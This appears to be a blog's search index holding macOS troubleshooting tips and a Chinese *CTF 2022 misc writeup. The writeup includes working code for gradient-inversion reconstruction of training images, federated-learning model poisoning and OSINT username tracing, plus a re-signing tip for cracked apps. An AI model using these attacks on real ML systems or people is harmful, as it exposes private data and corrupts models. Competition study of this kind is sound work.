\u4e0a\u6b63\u5e38\u5f39\u51fa\u8fd9\u4e2a\u78c1\u76d8\uff0c\u7136\u540e\u63d2\u5230 Windows \u4e0a\uff0c\u8d44\u6e90\u7ba1\u7406\u5668\u6253\u5f00\u78c1\u76d8\uff0c\u53f3\u952e\uff0c\u9009\u62e9 \u201c\u5c5e\u6027\u201d\uff0c\u7136\u540e\u9009\u62e9 \u201c\u5de5\u5177\u201d \u9009\u9879\u5361\uff0c\u70b9\u51fb \u201c\u68c0\u67e5\u201d\uff0c\u7136\u540e\u70b9\u51fb \u201c\u4fee\u590d\u201d\uff0c\u7b49\u5f85\u4fee\u590d\u5b8c\u6210\u3002\u7136\u540e\u518d\u63d2\u56de mac \u4e0a\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u6302\u8f7d\u8bfb\u5199\u4e86\u3002","title":"macOS TroubleShooting"},{"location":"others/troubleshooting/mac/#macos-troubleshooting","text":"Abstract \u5728 macOS \u4e0a\u9047\u5230\u8fc7\u7684\u4e00\u4e9b\u95ee\u9898\u548c\u89e3\u51b3\u65b9\u6cd5","title":"macOS TroubleShooting"},{"location":"others/troubleshooting/mac/#_1","text":"","title":"\u6709\u5173\u8f6f\u4ef6"},{"location":"others/troubleshooting/mac/#_2","text":"Warning \u8fd9\u90e8\u5206\u53ef\u80fd\u6709\u4e9b\u4e71\u5957\uff0c\u56e0\u4e3a\u662f\u56de\u5fc6\u51fa\u6765\u7684 \u65e0\u6cd5\u8ba4\u8bc1\u5f00\u53d1\u8005 \u76f4\u63a5\u901a\u8fc7\u8bbf\u8fbe\u53f3\u952e\u6253\u5f00\u8f6f\u4ef6\uff0c\u7b2c\u4e8c\u6b21\u5c31\u53ef\u4ee5\u5f3a\u5236\u6253\u5f00\uff0c\u540e\u7eed\u90fd\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00 \u5f3a\u5236\u7b7e\u540d codesign --sign - --force --deep /Applications/<app>.app \u5df2\u635f\u574f \u5bf9\u4e8e\u5305\u542b\u7834\u89e3\u7684\u8f6f\u4ef6\u7b49\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u5df2\u635f\u574f\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u6e05\u9664\u8f6f\u4ef6\u9694\u79bb\u5c5e\u6027\u6765\u89e3\u51b3 codesign --sign - --force --deep /Applications/<app>.app","title":"\u8f6f\u4ef6\u65e0\u6cd5\u6253\u5f00"},{"location":"others/troubleshooting/mac/#_3","text":"","title":"\u6709\u5173\u78c1\u76d8"},{"location":"others/troubleshooting/mac/#_4","text":"\u5927\u6982\u5c31\u662f\u79fb\u52a8\u786c\u76d8\u7a81\u7136\u65ad\u8fde\uff0c\u7136\u540e\u91cd\u65b0\u63d2\u5165\u7684\u65f6\u5019\u770b\u4e0d\u5230\u78c1\u76d8\u3002\u5728\u7cfb\u7edf\u78c1\u76d8\u5de5\u5177\u91cc\u53ef\u4ee5\u770b\u5230\u4e00\u5757\u672a\u88c5\u8f7d\u7684\u78c1\u76d8\uff08 diskutil list \u4e5f\u53ef\u4ee5\u770b\u5230\uff09\uff0c\u4f46\u662f\u65e0\u6cd5\u6302\u8f7d\uff08com.apple.DiskManagement.disenter \u9519\u8bef 0\uff09\u3002 \u89e3\u51b3\u65b9\u6848\u6765\u81ea https://www.xiaocrab.net/post/macos-exfat-diskmanagementdisenter-error-0/ \u9996\u5148 ps aux | grep fsck \uff0c\u68c0\u67e5\u662f\u5426\u6709 fsck \u7a0b\u5e8f\uff0c\u8fd9\u662f\u5bf9\u78c1\u76d8\u8fdb\u884c\u68c0\u67e5\u4fee\u590d\u7684\u7a0b\u5e8f\uff0c\u53ef\u80fd\u662f\u8fd9\u91cc\u5361\u4f4f\u4e86\u3002\u7136\u540e sudo pkill -f fsck \u4e2d\u65ad\u8fdb\u7a0b\u3002\u63a5\u7740\u4f1a\u5f39\u51fa \u201cmacOS \u65e0\u6cd5\u4fee\u590d\u78c1\u76d8\u201d \u7684\u8b66\u544a\uff0c\u8fd9\u65f6\u786c\u76d8\u53ef\u4ee5\u88c5\u8f7d\u4e0a\uff0c\u4e0d\u8fc7\u662f\u53ea\u8bfb\u7684\u3002 \u4e0b\u4e00\u6b65\u662f\u5728 mac \u4e0a\u6b63\u5e38\u5f39\u51fa\u8fd9\u4e2a\u78c1\u76d8\uff0c\u7136\u540e\u63d2\u5230 Windows \u4e0a\uff0c\u8d44\u6e90\u7ba1\u7406\u5668\u6253\u5f00\u78c1\u76d8\uff0c\u53f3\u952e\uff0c\u9009\u62e9 \u201c\u5c5e\u6027\u201d\uff0c\u7136\u540e\u9009\u62e9 \u201c\u5de5\u5177\u201d \u9009\u9879\u5361\uff0c\u70b9\u51fb \u201c\u68c0\u67e5\u201d\uff0c\u7136\u540e\u70b9\u51fb \u201c\u4fee\u590d\u201d\uff0c\u7b49\u5f85\u4fee\u590d\u5b8c\u6210\u3002\u7136\u540e\u518d\u63d2\u56de mac \u4e0a\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u6302\u8f7d\u8bfb\u5199\u4e86\u3002","title":"\u79fb\u52a8\u786c\u76d8\u5f02\u5e38\u9000\u51fa\u65e0\u6cd5\u518d\u6b21\u6302\u8f7d"},{"location":"writeups/","text":"Writeups \u00b6 Abstract \u8fd9\u91cc\u4f1a\u5f52\u6863\u4e00\u4e9b\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u6bd4\u8d5b\u6216\u8005\u89e3\u5bc6\u6e38\u620f\u7684 writeup\u3002 \u56e0\u4e3a\u6211\u76ee\u524d\u53ea\u4e3b\u653b misc \u65b9\u5411\uff0c\u6240\u4ee5\u8fd9\u91cc\u57fa\u672c\u90fd\u662f misc \u7684 writeup\uff08 \u540e\u7eed\u53ef\u80fd\u4f1a\u52a0\u65b9\u5411\uff1f \uff09 \u5176\u4e2d\u4e5f\u4f1a\u6709\u4e00\u4e9b\u6ca1\u505a\u51fa\u4f46\u662f\u6709\u4ef7\u503c\u7684\u9898\u76ee\u662f\u6839\u636e\u522b\u4eba/\u5b98\u65b9 writeup \u590d\u73b0\u800c\u6765\u7684 Table of Contents \u00b6 Training \u00b6 \ud83d\udd12 AAA School Bus \uff08\u6d59\u5927\u6821\u5185 CTF \u9898\u76ee\u5e73\u53f0 writeup\uff0c\u6682\u4e0d\u516c\u5f00\uff09 Ethernaut Security Innovation Smart Contract CTF SadServers (DevOps) 2021 \u00b6 SYSU MSC Puzzle 2021 USTC Hackergame 2021 \u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b ByteCTF 2021 Final SCTF 2021 2022 \u00b6 VNCTF 2022 TQLCTF 2022 SUSCTF 2022 D^3CTF 2022 *CTF 2022 MRCTF 2022 \u5f3a\u7f51\u676f 2022 Quals TCTF/0CTF 2022 USTC Hackergame 2022 N1CTF 2022 SECCON CTF 2022 Quals","title":"Writeups"},{"location":"writeups/#writeups","text":"Abstract \u8fd9\u91cc\u4f1a\u5f52\u6863\u4e00\u4e9b\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u6bd4\u8d5b\u6216\u8005\u89e3\u5bc6\u6e38\u620f\u7684 writeup\u3002 \u56e0\u4e3a\u6211\u76ee\u524d\u53ea\u4e3b\u653b misc \u65b9\u5411\uff0c\u6240\u4ee5\u8fd9\u91cc\u57fa\u672c\u90fd\u662f misc \u7684 writeup\uff08 \u540e\u7eed\u53ef\u80fd\u4f1a\u52a0\u65b9\u5411\uff1f \uff09 \u5176\u4e2d\u4e5f\u4f1a\u6709\u4e00\u4e9b\u6ca1\u505a\u51fa\u4f46\u662f\u6709\u4ef7\u503c\u7684\u9898\u76ee\u662f\u6839\u636e\u522b\u4eba/\u5b98\u65b9 writeup \u590d\u73b0\u800c\u6765\u7684","title":"Writeups"},{"location":"writeups/#table-of-contents","text":"","title":"Table of Contents"},{"location":"writeups/#training","text":"\ud83d\udd12 AAA School Bus \uff08\u6d59\u5927\u6821\u5185 CTF \u9898\u76ee\u5e73\u53f0 writeup\uff0c\u6682\u4e0d\u516c\u5f00\uff09 Ethernaut Security Innovation Smart Contract CTF SadServers (DevOps)","title":"Training"},{"location":"writeups/#2021","text":"SYSU MSC Puzzle 2021 USTC Hackergame 2021 \u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b ByteCTF 2021 Final SCTF 2021","title":"2021"},{"location":"writeups/#2022","text":"VNCTF 2022 TQLCTF 2022 SUSCTF 2022 D^3CTF 2022 *CTF 2022 MRCTF 2022 \u5f3a\u7f51\u676f 2022 Quals TCTF/0CTF 2022 USTC Hackergame 2022 N1CTF 2022 SECCON CTF 2022 Quals","title":"2022"},{"location":"writeups/%2Actf2022/","text":"*CTF 2022 Writeup \u00b6 Abstract misc \u51e0\u4e4e\u90fd\u662f AI \u7684\u4e00\u573a\u6bd4\u8d5b\uff0c\u9664\u4e86\u6709\u4e00\u9053\u7b80\u5355\u9898\u9644\u4ef6\u51fa\u95ee\u9898\u4e86\u6ca1\u505a\u51fa\u6765\u4ee5\u5916 AK \u4e86 Today \u00b6 \u6839\u636e\u9898\u76ee\u4e2d\u7684 \u201clove machine learning and data science\u201d \u53bb Kaggle \u627e\u4e00\u627e\uff08\u8d5b\u540e\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sherlock-project/sherlock \u641c\u7d22\u7528\u6237\u540d\uff09 \u76f4\u63a5\u8bbf\u95ee\u7528\u6237\u540d https://www.kaggle.com/anninefour \uff0c\u6709\u8fd9\u4e2a\u4eba\uff0c\u5e76\u4e14\u6709 twitter \u94fe\u63a5\uff1a https://twitter.com/1liujing \u5f88\u597d\u627e\uff1a\u4e0a\u6d77\u519c\u592b\u679c\u54c1\u751f\u9c9c\u8d85\u5e02(\u82b1\u5c71\u8def\u5e97) \u62cd\u6444\u8005\u6240\u5728\u4f4d\u7f6e\u662f\u82b1\u5c71\u540d\u82d1\u5317\u95e8 \u7ffb webarchive\uff1a \u4ece google map \u627e\uff0c\u53d1\u73b0\u8bc4\u8bba\u533a\u4f0a\u6d41\u666f\u8bc4\u8bba\u7684 flag\uff1a flag: *CTF{aGFwcHlsb2NrZG93bg==} \uff08\u770b\u4e86\u4e09\u4e2a\u5c0f\u65f6\u201c\u82b1\u5c71\u540d\u82d1\u5317\u95e8\u201d\u627e\u4e0d\u51fa\u540d\u5802\uff0c\u539f\u6765\u53ea\u5728\u201c\u82b1\u5c71\u540d\u82d1\u201d\u624d\u80fd\u770b\u5230\u2026\u2026\uff09 Alice\u2019s Warm Up \u00b6 \u52a0\u8f7d\u6a21\u578b\u9700\u8981\u81ea\u5b9a\u4e49 Unpickler import torch import string from torch import nn import pickle class AliceNet1 ( nn . Module ): def forward ( self , x ): return self . fc ( x ) class Unpickler ( pickle . Unpickler ): def __init__ ( self , file ): super () . __init__ ( file ) def persistent_load ( self , pid ): print ( pid , pid [ 2 ]) return pid [ 1 ] . from_file ( f 'data/ { pid [ 2 ] } ' , False , pid [ 4 ]) with open ( 'data.pkl' , 'rb' ) as f : p = Unpickler ( f ) . load () print ( p ) \uff08\u8d5b\u540e\u770b\u5b98\u65b9 wp \u662f\u8bf4\u53ef\u4ee5\u76f4\u63a5\u7528 torch.load \u8f7d\u5165\u9644\u4ef6\u7684 zip\uff09 0.weight \u77e9\u9635\u53ea\u6709 0 \u548c 1\uff0c\u6bd4\u8f83\u5947\u602a\uff0c\u5c06\u6bcf\u884c\u4e3a 1 \u7684\u503c\u63d0\u51fa for i , w in enumerate ( p . fc . state_dict ()[ \"0.weight\" ]): print ( i , [ j for j , x in enumerate ( w ) if x == 1.0 ]) \u5f97\u5230\u4e0b\u9762\u7ed3\u679c\uff0c\u6309\u7167 flagset \uff0c36\uff08*\uff09\u662f\u8d77\u70b9\uff0c46\uff08}\uff09\u662f\u7ec8\u70b9\uff0c\u8981\u627e\u5230\u957f\u5ea6\u4e3a 16 \u7684\u8def\u5f84\uff0c\u539f\u59cb\u77e9\u9635\u5c31\u662f\u6709\u5411\u56fe\u7684\u90bb\u63a5\u77e9\u9635 0 [ 2 , 13 , 29 ] 1 [ 19 ] 2 [ 5 , 6 , 8 , 31 ] 3 [ 2 , 4 , 7 , 29 , 41 ] 4 [ 7 , 29 , 34 , 41 , 45 ] 5 [ 2 , 3 , 6 , 9 , 31 ] 6 [ 3 ] 7 [ 8 , 41 , 42 ] 8 [ 3 , 44 ] 9 [ 13 , 14 , 17 , 31 , 42 , 43 , 45 ] 10 [] 11 [ 7 , 9 , 44 ] 12 [ 3 , 4 , 6 , 7 , 14 , 15 , 29 ] 13 [ 8 , 14 , 15 ] 14 [ 2 , 6 , 17 , 29 , 41 , 42 ] 15 [ 4 , 5 , 8 , 28 , 41 , 44 ] 16 [ 3 , 43 , 44 ] 17 [ 8 , 41 , 42 ] 18 [ 27 ] 19 [ 30 ] 20 [ 35 ] 21 [ 22 ] 22 [ 27 ] 23 [ 22 ] 24 [ 46 ] 25 [ 3 , 5 , 8 , 29 , 34 , 43 , 45 ] 26 [ 33 ] 27 [ 46 ] 28 [ 9 , 17 , 43 ] 29 [ 2 , 4 , 9 , 31 , 44 ] 30 [ 20 ] 31 [ 4 , 42 , 44 , 45 ] 32 [ 23 ] 33 [ 1 ] 34 [ 8 , 15 , 43 , 44 ] 35 [ 23 ] 36 [ 37 ] 37 [ 38 ] 38 [ 39 ] 39 [ 40 ] 40 [ 0 , 10 , 11 , 12 , 16 , 18 , 21 , 24 , 25 , 26 , 32 ] 41 [ 28 , 31 , 43 ] 42 [ 2 , 41 ] 43 [ 3 , 5 , 13 , 14 , 29 , 34 ] 44 [ 8 , 15 , 29 ] 45 [ 3 , 4 , 5 , 41 , 42 ] 46 [] \u6b63\u5411\u6709\u73af\uff0c\u53cd\u5411\u641c flagset = string . printable [ 0 : 36 ] + \"*CTF {ALIZE} \" m = p . fc . state_dict ()[ \"0.weight\" ] def search ( prev , x , n ): if n == 16 : if x == 36 : ans = [ x ] + prev print ( '' . join ( flagset [ i ] for i in ans )) return for y , yv in enumerate ( m ): if yv [ x ] == 1.0 : search ([ x ] + prev , y , n + 1 ) search ([], 46 , 1 ) flag: *CTF{qx1jukznmr} Alice\u2019s challenge \u00b6 \u6839\u636e\u68af\u5ea6\u548c\u6700\u7ec8\u6a21\u578b\u653b\u51fb\u51fa\u8bad\u7ec3\u56fe\u7247\uff0c\u8c03\u7528 JonasGeiping/breaching inverting gradients import json import torch import numpy as np from torch import nn import breaching import matplotlib.pyplot as plt class AliceNet2 ( nn . Module ): def __init__ ( self ) -> None : super () . __init__ () self . conv = nn . Sequential ( nn . Conv2d ( 3 , 12 , kernel_size = ( 5 , 5 ), stride = ( 2 , 2 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 2 , 2 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 1 , 1 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 1 , 1 ), padding = ( 2 , 2 )), nn . Sigmoid (), ) self . fc = nn . Sequential ( nn . Linear ( in_features = 768 , out_features = 200 , bias = True ) ) def forward ( self , x ): x1 = self . conv ( x ) fc_input = x1 . reshape ( 1 , 768 ) x2 = self . fc ( fc_input ) return x2 def distribute_payload ( model , cfg_data ): \"\"\"Server payload to send to users. These are only references to simplfiy the simulation.\"\"\" honest_model_parameters = [ p for p in model . parameters ()] # do not send only the generators honest_model_buffers = [ b for b in model . buffers ()] return dict ( parameters = honest_model_parameters , buffers = honest_model_buffers , metadata = cfg_data ) def plot ( user_data , cfg , i , scale = False , print_labels = False ): \"\"\"Plot user data to output. Probably best called from a jupyter notebook.\"\"\" dm = torch . as_tensor ( cfg . mean , ** setup )[ None , :, None , None ] ds = torch . as_tensor ( cfg . std , ** setup )[ None , :, None , None ] classes = cfg . classes data = user_data [ \"data\" ] . clone () . detach () labels = user_data [ \"labels\" ] . clone () . detach () if user_data [ \"labels\" ] is not None else None if labels is None : print_labels = False if scale : min_val , max_val = data . amin ( dim = [ 2 , 3 ], keepdim = True ), data . amax ( dim = [ 2 , 3 ], keepdim = True ) # print(f'min_val: {min_val} | max_val: {max_val}') data = ( data - min_val ) / ( max_val - min_val ) else : data . mul_ ( ds ) . add_ ( dm ) . clamp_ ( 0 , 1 ) data = data . to ( dtype = torch . float32 ) if data . shape [ 0 ] == 1 : plt . figure ( i ) plt . axis ( \"off\" ) plt . imshow ( data [ 0 ] . permute ( 1 , 2 , 0 ) . cpu ()) if print_labels : plt . title ( f \"Data with label { classes [ labels ] } \" ) else : grid_shape = int ( torch . as_tensor ( data . shape [ 0 ]) . sqrt () . ceil ()) s = 24 if data . shape [ 3 ] > 150 else 6 fig , axes = plt . subplots ( grid_shape , grid_shape , figsize = ( s , s )) label_classes = [] for i , ( im , axis ) in enumerate ( zip ( data , axes . flatten ())): axis . imshow ( im . permute ( 1 , 2 , 0 ) . cpu ()) if labels is not None and print_labels : label_classes . append ( classes [ labels [ i ]]) axis . axis ( \"off\" ) if print_labels : print ( label_classes ) if __name__ == \"__main__\" : model = torch . load ( 'Net.model' , map_location = 'cpu' ) device = torch . device ( 'cpu' ) cfg = breaching . get_attack_config ( \"invertinggradients\" , overrides = []) cfg . optim . max_iterations = 200 print ( cfg ) setup = dict ( device = device , dtype = getattr ( torch , cfg . impl . dtype )) loss_fn = nn . CrossEntropyLoss () attacker = breaching . attacks . prepare_attack ( model , loss_fn , cfg , setup ) _cfg = breaching . get_config ( overrides = []) _cfg . case . data . shape = ( 3 , 32 , 32 ) print ( _cfg . case . data ) server_payload = distribute_payload ( model , _cfg . case . data ) print ( len ( server_payload )) grads = [] for i in range ( 25 ): grads . append ( torch . load ( f 'grad/ { i } .tensor' , map_location = 'cpu' )) data = [] for i in range ( 25 ): print ( i ) metadata = dict ( num_data_points = 1 , labels = None , local_hyperparams = None , ) shared_grads = grads [ i ] shared_user_data = dict ( gradients = shared_grads , buffers = None , metadata = metadata ) reconstructed_user_data , stats = attacker . reconstruct ( [ server_payload ], [ shared_user_data ], {}, dryrun = False ) data . append ( reconstructed_user_data ) for i in range ( len ( data )): plot ( data [ i ], _cfg . case . data , i ) \u8dd1\u51fa 25 \u5f20\u56fe\u7247\u7136\u540e\u731c+\u62fc\u63a5\u51fa flag: *CTF{PZEXHBEARAK8MQT5NAliceE} \u770b\u5b98\u65b9 wp \u662f\u76f4\u63a5\u6539\u7684 mit-han-lab/dlg \u91cc\u7684\u4ee3\u7801\uff0c\u6548\u679c\u66f4\u6e05\u6670 babyFL \u00b6 \u672c\u5730\u8bad\u7ec3 1 \u4e2a\u9519\u8bef\u6a21\u578b\u548c 20 \u4e2a\u6b63\u786e\u6a21\u578b\uff0c\u53cd\u6c42\u6743\u91cd\uff0c\u53ef\u4ee5\u505a\u51fa\u3002\u4f46\u8fd9\u6837\u505a\u8fdc\u7a0b\u6b63\u786e\u7387\u53ea\u6709 0.91\uff0c\u5c06\u9519\u8bef\u6a21\u578b\u53c2\u6570\u7ffb\u500d\u5219\u53ef\u8fbe\u5230\u8981\u6c42 def load_adv_data (): ( x , y ), ( _ , _ ) = mnist . load_data () l = len ( y ) for i in range ( l ): y [ i ] = 9 - y [ i ] x = x . reshape ( - 1 , 28 , 28 , 1 ) return x , y def train_adv_model (): x , y = load_adv_data () model = new_model () model . fit ( x , y , batch_size = 64 , epochs = 10 ) model . save ( \"./model/adv\" ) train_adv_model () def load_adv_parameters (): print ( 'load parameter' ) parameters = [] model = load_model ( \"./model/adv\" ) for i in range ( 8 ): layer = [] temp = model . get_weights () layer . append ( temp [ i ]) parameters . append ( layer ) return parameters adv_parameters = load_adv_parameters () def unaggregation ( parameters , adv_parameters ): weights = [] for layer , adv_layer in zip ( parameters , adv_parameters ): sum = 0 l = len ( layer ) for temp in layer : sum = sum + temp adv_sum = 0 l = len ( adv_layer ) for temp in adv_layer : adv_sum = adv_sum + temp weights . append ( adv_sum * participant_number * 2 - sum ) return weights output = unaggregation ( parameters , adv_parameters ) def write_output ( f , out ): if ( type ( out ) == list ) or ( type ( out ) != list and len ( out . shape ) > 1 ): for temp in out : write_output ( f , temp ) else : l = len ( out ) for i in range ( l ): f . write ( f ' { out [ i ] } \\n ' ) with open ( 'out.txt' , 'w' ) as f : write_output ( f , output ) \u7136\u540e\u8bfb\u53d6 out.txt \u7528 pwntools \u4f9d\u6b21\u8f93\u5165\u5373\u53ef\u62ff\u5230\u5b8c\u6210\u8981\u6c42\u62ff\u5230 flag: *CTF{ESfSQIuTXVgsgA15kb2LclgKI91Qz63bSd17RpU0} overfit \u00b6 \u8fd9\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u4f46\u662f\u662f\u9644\u4ef6\u95ee\u9898\uff0c\u51fa\u9898\u4eba\u4e0a\u4f20\u9644\u4ef6\u4e22\u5305\u4e86 \u6839\u636e https://github.com/huggingface/transformers/blob/main/src/transformers/models/gpt2/tokenization_gpt2.py \u4e0b\u8f7d\u4e00\u4e0b\u7f3a\u5c11\u7684 vocab.json \u548c merges.txt\uff1a PRETRAINED_VOCAB_FILES_MAP = { \"vocab_file\" : { \"gpt2\" : \"https://huggingface.co/gpt2/resolve/main/vocab.json\" , \"gpt2-medium\" : \"https://huggingface.co/gpt2-medium/resolve/main/vocab.json\" , \"gpt2-large\" : \"https://huggingface.co/gpt2-large/resolve/main/vocab.json\" , \"gpt2-xl\" : \"https://huggingface.co/gpt2-xl/resolve/main/vocab.json\" , \"distilgpt2\" : \"https://huggingface.co/distilgpt2/resolve/main/vocab.json\" , }, \"merges_file\" : { \"gpt2\" : \"https://huggingface.co/gpt2/resolve/main/merges.txt\" , \"gpt2-medium\" : \"https://huggingface.co/gpt2-medium/resolve/main/merges.txt\" , \"gpt2-large\" : \"https://huggingface.co/gpt2-large/resolve/main/merges.txt\" , \"gpt2-xl\" : \"https://huggingface.co/gpt2-xl/resolve/main/merges.txt\" , \"distilgpt2\" : \"https://huggingface.co/distilgpt2/resolve/main/merges.txt\" , }, } \u7528\u6700\u5c0f\u7684 gpt2 \u5c31\u53ef\u4ee5 \u8f7d\u5165\u4e00\u4e0b pretrained \u5206\u8bcd\u5668\u548c\u6a21\u578b\uff0c\u7136\u540e\u6839\u636e\u9898\u76ee\u540d overfit\uff0c\u8fc7\u62df\u5408\uff0c\u5582\u4e00\u4e0b *CTF \u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u7684 flag from transformers import GPT2Tokenizer , GPT2LMHeadModel import torch tokenizer = GPT2Tokenizer . from_pretrained ( \"./model\" ) model = GPT2LMHeadModel . from_pretrained ( \"./model\" ) text = '*CTF{' encoded_input = tokenizer ( text , return_tensors = 'pt' ) . input_ids output = model . generate ( inputs = encoded_input ) print ( tokenizer . batch_decode ( sequences = output )) # ['*CTF{say_h31l0_2_p1m!} - {'] \u6216\u8005\u4f7f\u7528 aitextgen \u5305\uff0c\u4e0d\u9700\u8981\u8865 vocab.json \u548c merges.txt\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u8f7d\u5165\uff0c\u7136\u540e\u8f93\u51fa\u7ed3\u679c\uff1a from aitextgen import aitextgen print ( aitextgen ( model_folder = './models' ) . generate ( n = 1 , prompt = \"*CTF\" , max_length = 100 )) flag: *CTF{say_h31l0_2_p1m!}","title":"*CTF 2022"},{"location":"writeups/%2Actf2022/#ctf-2022-writeup","text":"Abstract misc \u51e0\u4e4e\u90fd\u662f AI \u7684\u4e00\u573a\u6bd4\u8d5b\uff0c\u9664\u4e86\u6709\u4e00\u9053\u7b80\u5355\u9898\u9644\u4ef6\u51fa\u95ee\u9898\u4e86\u6ca1\u505a\u51fa\u6765\u4ee5\u5916 AK \u4e86","title":"*CTF 2022 Writeup"},{"location":"writeups/%2Actf2022/#today","text":"\u6839\u636e\u9898\u76ee\u4e2d\u7684 \u201clove machine learning and data science\u201d \u53bb Kaggle \u627e\u4e00\u627e\uff08\u8d5b\u540e\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sherlock-project/sherlock \u641c\u7d22\u7528\u6237\u540d\uff09 \u76f4\u63a5\u8bbf\u95ee\u7528\u6237\u540d https://www.kaggle.com/anninefour \uff0c\u6709\u8fd9\u4e2a\u4eba\uff0c\u5e76\u4e14\u6709 twitter \u94fe\u63a5\uff1a https://twitter.com/1liujing \u5f88\u597d\u627e\uff1a\u4e0a\u6d77\u519c\u592b\u679c\u54c1\u751f\u9c9c\u8d85\u5e02(\u82b1\u5c71\u8def\u5e97) \u62cd\u6444\u8005\u6240\u5728\u4f4d\u7f6e\u662f\u82b1\u5c71\u540d\u82d1\u5317\u95e8 \u7ffb webarchive\uff1a \u4ece google map \u627e\uff0c\u53d1\u73b0\u8bc4\u8bba\u533a\u4f0a\u6d41\u666f\u8bc4\u8bba\u7684 flag\uff1a flag: *CTF{aGFwcHlsb2NrZG93bg==} \uff08\u770b\u4e86\u4e09\u4e2a\u5c0f\u65f6\u201c\u82b1\u5c71\u540d\u82d1\u5317\u95e8\u201d\u627e\u4e0d\u51fa\u540d\u5802\uff0c\u539f\u6765\u53ea\u5728\u201c\u82b1\u5c71\u540d\u82d1\u201d\u624d\u80fd\u770b\u5230\u2026\u2026\uff09","title":"Today"},{"location":"writeups/%2Actf2022/#alices-warm-up","text":"\u52a0\u8f7d\u6a21\u578b\u9700\u8981\u81ea\u5b9a\u4e49 Unpickler import torch import string from torch import nn import pickle class AliceNet1 ( nn . Module ): def forward ( self , x ): return self . fc ( x ) class Unpickler ( pickle . Unpickler ): def __init__ ( self , file ): super () . __init__ ( file ) def persistent_load ( self , pid ): print ( pid , pid [ 2 ]) return pid [ 1 ] . from_file ( f 'data/ { pid [ 2 ] } ' , False , pid [ 4 ]) with open ( 'data.pkl' , 'rb' ) as f : p = Unpickler ( f ) . load () print ( p ) \uff08\u8d5b\u540e\u770b\u5b98\u65b9 wp \u662f\u8bf4\u53ef\u4ee5\u76f4\u63a5\u7528 torch.load \u8f7d\u5165\u9644\u4ef6\u7684 zip\uff09 0.weight \u77e9\u9635\u53ea\u6709 0 \u548c 1\uff0c\u6bd4\u8f83\u5947\u602a\uff0c\u5c06\u6bcf\u884c\u4e3a 1 \u7684\u503c\u63d0\u51fa for i , w in enumerate ( p . fc . state_dict ()[ \"0.weight\" ]): print ( i , [ j for j , x in enumerate ( w ) if x == 1.0 ]) \u5f97\u5230\u4e0b\u9762\u7ed3\u679c\uff0c\u6309\u7167 flagset \uff0c36\uff08*\uff09\u662f\u8d77\u70b9\uff0c46\uff08}\uff09\u662f\u7ec8\u70b9\uff0c\u8981\u627e\u5230\u957f\u5ea6\u4e3a 16 \u7684\u8def\u5f84\uff0c\u539f\u59cb\u77e9\u9635\u5c31\u662f\u6709\u5411\u56fe\u7684\u90bb\u63a5\u77e9\u9635 0 [ 2 , 13 , 29 ] 1 [ 19 ] 2 [ 5 , 6 , 8 , 31 ] 3 [ 2 , 4 , 7 , 29 , 41 ] 4 [ 7 , 29 , 34 , 41 , 45 ] 5 [ 2 , 3 , 6 , 9 , 31 ] 6 [ 3 ] 7 [ 8 , 41 , 42 ] 8 [ 3 , 44 ] 9 [ 13 , 14 , 17 , 31 , 42 , 43 , 45 ] 10 [] 11 [ 7 , 9 , 44 ] 12 [ 3 , 4 , 6 , 7 , 14 , 15 , 29 ] 13 [ 8 , 14 , 15 ] 14 [ 2 , 6 , 17 , 29 , 41 , 42 ] 15 [ 4 , 5 , 8 , 28 , 41 , 44 ] 16 [ 3 , 43 , 44 ] 17 [ 8 , 41 , 42 ] 18 [ 27 ] 19 [ 30 ] 20 [ 35 ] 21 [ 22 ] 22 [ 27 ] 23 [ 22 ] 24 [ 46 ] 25 [ 3 , 5 , 8 , 29 , 34 , 43 , 45 ] 26 [ 33 ] 27 [ 46 ] 28 [ 9 , 17 , 43 ] 29 [ 2 , 4 , 9 , 31 , 44 ] 30 [ 20 ] 31 [ 4 , 42 , 44 , 45 ] 32 [ 23 ] 33 [ 1 ] 34 [ 8 , 15 , 43 , 44 ] 35 [ 23 ] 36 [ 37 ] 37 [ 38 ] 38 [ 39 ] 39 [ 40 ] 40 [ 0 , 10 , 11 , 12 , 16 , 18 , 21 , 24 , 25 , 26 , 32 ] 41 [ 28 , 31 , 43 ] 42 [ 2 , 41 ] 43 [ 3 , 5 , 13 , 14 , 29 , 34 ] 44 [ 8 , 15 , 29 ] 45 [ 3 , 4 , 5 , 41 , 42 ] 46 [] \u6b63\u5411\u6709\u73af\uff0c\u53cd\u5411\u641c flagset = string . printable [ 0 : 36 ] + \"*CTF {ALIZE} \" m = p . fc . state_dict ()[ \"0.weight\" ] def search ( prev , x , n ): if n == 16 : if x == 36 : ans = [ x ] + prev print ( '' . join ( flagset [ i ] for i in ans )) return for y , yv in enumerate ( m ): if yv [ x ] == 1.0 : search ([ x ] + prev , y , n + 1 ) search ([], 46 , 1 ) flag: *CTF{qx1jukznmr}","title":"Alice\u2019s Warm Up"},{"location":"writeups/%2Actf2022/#alices-challenge","text":"\u6839\u636e\u68af\u5ea6\u548c\u6700\u7ec8\u6a21\u578b\u653b\u51fb\u51fa\u8bad\u7ec3\u56fe\u7247\uff0c\u8c03\u7528 JonasGeiping/breaching inverting gradients import json import torch import numpy as np from torch import nn import breaching import matplotlib.pyplot as plt class AliceNet2 ( nn . Module ): def __init__ ( self ) -> None : super () . __init__ () self . conv 